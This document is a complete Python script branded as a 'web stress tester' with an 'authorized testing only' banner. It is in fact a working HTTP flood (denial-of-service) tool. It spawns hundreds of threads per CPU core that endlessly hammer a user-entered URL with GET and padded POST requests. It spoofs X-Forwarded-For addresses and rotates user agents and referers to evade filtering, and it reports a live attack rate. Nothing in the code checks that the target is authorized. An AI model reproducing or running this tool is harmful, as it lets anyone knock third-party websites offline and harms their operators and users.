#!/usr/bin/env python3

import requests
import threading
import multiprocessing
import time
import random
import sys
import os

R = "[1;31m"
G = "[1;32m"
Y = "[1;33m"
C = "[1;36m"
W = "[1;37m"
D = "[0m"

def banner():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"""
{C}╔══════════════════════════════════════════════════════════════╗
║{W}     █████╗ ██╗   ██╗████████╗██████╗  ██████╗     ██╗    ██╗{C}  ║
║{W}    ██╔══██╗██║   ██║╚══██╔══╝██╔══██╗██╔═══██╗    ██║    ██║{C}  ║
║{W}    ███████║██║   ██║   ██║   ██████╔╝██║   ██║    ██║ █╗ ██║{C}  ║
║{W}    ██╔══██║██║   ██║   ██║   ██╔══██╗██║   ██║    ██║███╗██║{C}  ║
║{W}    ██║  ██║╚██████╔╝   ██║   ██║  ██║╚██████╔╝    ╚███╔███╔╝{C}  ║
║{W}    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝      ╚══╝╚══╝ {C}  ║
║{Y}                    [ WEB STRESS TESTER ]{C}                     ║
║{R}         ⚠  FOR AUTHORIZED TESTING ONLY  ⚠{C}                  ║
╚══════════════════════════════════════════════════════════════╝{D}
""")

URL = ""
THREADS_PER_PROCESS = 500
PROCESSES = multiprocessing.cpu_count()
TIMEOUT = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
]

sent_counter = multiprocessing.Value("i", 0)
failed_counter = multiprocessing.Value("i", 0)

def attack_thread():
    session = requests.Session()
    session.headers.update({
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
    })
    while True:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Request-ID": str(random.randint(100000, 999999)),
                "Referer": random.choice(["https://google.com", "https://facebook.com", "https://twitter.com"]),
            }
            session.get(URL, headers=headers, timeout=TIMEOUT, stream=True)
            with sent_counter.get_lock():
                sent_counter.value += 1
            if random.random() > 0.7:
                data = {"x": "A" * random.randint(100, 5000)}
                session.post(URL, data=data, headers=headers, timeout=TIMEOUT)
                with sent_counter.get_lock():
                    sent_counter.value += 1
        except:
            with failed_counter.get_lock():
                failed_counter.value += 1

def attack_process(process_id):
    print(f"{G}[+] {C}Process {process_id}{W} launched with {THREADS_PER_PROCESS} threads{D}")
    threads = []
    for _ in range(THREADS_PER_PROCESS):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
        threads.append(t)
    while True:
        time.sleep(1)

def monitor():
    prev = 0
    while True:
        time.sleep(1)
        with sent_counter.get_lock():
            current = sent_counter.value
        with failed_counter.get_lock():
            failed = failed_counter.value
        rate = current - prev
        prev = current
        sys.stdout.write(f"\r{Y}[{W}STATUS{Y}]{W} Sent: {G}{current:,}{W} | Failed: {R}{failed:,}{W} | Rate: {C}~{rate:,}/s{W}       {D}")
        sys.stdout.flush()

if __name__ == "__main__":
    banner()
    raw = input(f"{C}[?]{W} Target URL: {Y}").strip()
    print(D, end="")
    if not raw:
        print(f"{R}[!]{W} No URL provided. Exiting.{D}")
        sys.exit(1)
    URL = raw if raw.startswith(("http://", "https://")) else "http://" + raw

    print(f"{G}[+]{W} Target: {C}{URL}{D}")
    print(f"{G}[+]{W} Cores: {C}{PROCESSES}{W} | Threads: {C}{THREADS_PER_PROCESS * PROCESSES:,}{D}")
    print(f"{Y}─" * 62 + D)

    confirm = input(f"{R}[!]{W} Type {Y}YES{W} to start: {Y}").strip()
    print(D, end="")
    if confirm != "YES":
        print(f"{R}[!]{W} Aborted.{D}")
        sys.exit(0)

    print(f"\n{C}[*]{W} Initializing attack...{D}\n")

    monitor_thread = threading.Thread(target=monitor)
    monitor_thread.daemon = True
    monitor_thread.start()

    processes = []
    for i in range(PROCESSES):
        p = multiprocessing.Process(target=attack_process, args=(i,))
        p.start()
        processes.append(p)

    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print(f"\n\n{R}[!]{W} Attack stopped by user.{D}")
        for p in processes:
            p.terminate()
